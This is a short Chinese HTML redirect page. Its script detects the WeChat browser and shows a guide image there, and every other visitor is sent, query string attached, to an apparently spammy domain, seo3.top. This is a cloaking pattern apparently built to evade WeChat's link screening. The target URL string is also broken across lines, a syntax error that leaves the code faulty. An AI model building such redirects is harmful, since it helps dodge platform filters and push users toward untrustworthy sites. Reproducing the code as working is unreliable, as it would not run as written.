<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>跳转页面</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background-color: #fff;
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            text-align: center;
            overflow: hidden; /* 防止滚动 */
        }
        .container {
            max-width: 100%; /* 移除固定宽度，适配全屏 */
            width: 100%;
            padding: 0; /* 移除内边距，让图片占满 */
            height: 100vh; /* 容器高度占满屏幕 */
        }
        .guide-img {
            max-width: 100%; /* 确保图片不超过容器宽度 */
            width: 100%; /* 铺满容器宽度 */
            height: auto; /* 按比例缩放高度 */
            object-fit: cover; /* 铺满并裁剪，保持比例 */
            display: block;
            margin: 0 auto; /* 居中 */
        }
        @media (max-width: 400px) {
            .guide-img {
                max-width: 100%; /* 小屏仍自适应 */
                width: 100%; /* 确保铺满 */
            }
        }
    </style>
    <script>
        // 检测是否为微信客户端
        function isWeChat() {
            const ua = navigator.userAgent.toLowerCase();
            return ua.includes('micromessenger');
        }

        // 页面加载时执行逻辑
        window.onload = function() {
            // 获取当前 URL 的查询参数
            const queryString = window.location.search;
            // 目标跳转 URL
            const targetUrl = 'http://seo3.top/haokan?ldk=xxx

';
            // 拼接查询参数到目标 URL
            const redirectUrl = targetUrl + queryString;

            const messageDiv = document.getElementById('message');
            if (isWeChat()) {
                // 微信中显示全屏自适应引导图片
                messageDiv.innerHTML = `
                    <img src="https://github.com/CandiceBert/tv/20250725140649_29124.jpg" class="guide-img" alt="微信引导图片">
                `;
            } else {
                // 非微信环境直接跳转
                window.location.href = redirectUrl;
            }
        };
    </script>
</head>
<body>
    <div class="container">
        <div id="message">
            
        </div>
    </div>
</body>
</html>
